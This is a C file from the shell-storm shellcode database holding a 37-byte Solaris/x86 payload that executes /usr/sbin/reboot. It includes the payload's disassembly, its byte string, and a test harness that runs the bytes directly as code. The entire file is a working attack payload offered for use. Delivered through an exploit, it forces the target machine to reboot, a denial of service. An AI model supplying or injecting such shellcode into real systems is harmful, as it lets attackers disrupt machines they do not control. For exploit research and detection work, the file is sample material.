/*
Title:   Solaris/x86 - Reboot() - 37 bytes
Author:  Jonathan Salwan <submit!shell-storm.org>
Web:     http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan

Date:	 2010-05-21
Tested:  SunOS opensolaris 5.11 snv_111b i86pc i386 i86pc Solaris

!Database of Shellcodes http://www.shell-storm.org/shellcode/


Description:
------------

 The reboot utility restarts the kernel. The kernel is loaded
 into  memory by the PROM monitor, which transfers control to
 the loaded kernel.



Disassembly informations:
-------------------------

section .text
    0x8048074:              31 c0              xorl   %eax,%eax
    0x8048076:              50                 pushl  %eax
    0x8048077:              68 62 6f 6f 74     pushl  $0x746f6f62
    0x804807c:              68 6e 2f 72 65     pushl  $0x65722f6e
    0x8048081:              68 2f 73 62 69     pushl  $0x6962732f
    0x8048086:              68 2f 75 73 72     pushl  $0x7273752f
    0x804808b:              89 e3              movl   %esp,%ebx
    0x804808d:              50                 pushl  %eax
    0x804808e:              53                 pushl  %ebx
    0x804808f:              89 e1              movl   %esp,%ecx
    0x8048091:              50                 pushl  %eax
    0x8048092:              51                 pushl  %ecx
    0x8048093:              53                 pushl  %ebx
    0x8048094:              b0 0b              movb   $0xb,%al
    0x8048096:              50                 pushl  %eax
    0x8048097:              cd 91              int    $0x91

*/

#include <stdio.h>

char sc[] = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"
            "\x2f\x72\x65\x68\x2f\x73\x62\x69\x68\x2f"
            "\x75\x73\x72\x89\xe3\x50\x53\x89\xe1\x50"
            "\x51\x53\xb0\x0b\x50\xcd\x91";


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(sc));
        (*(void(*)()) sc)();

return 0;
}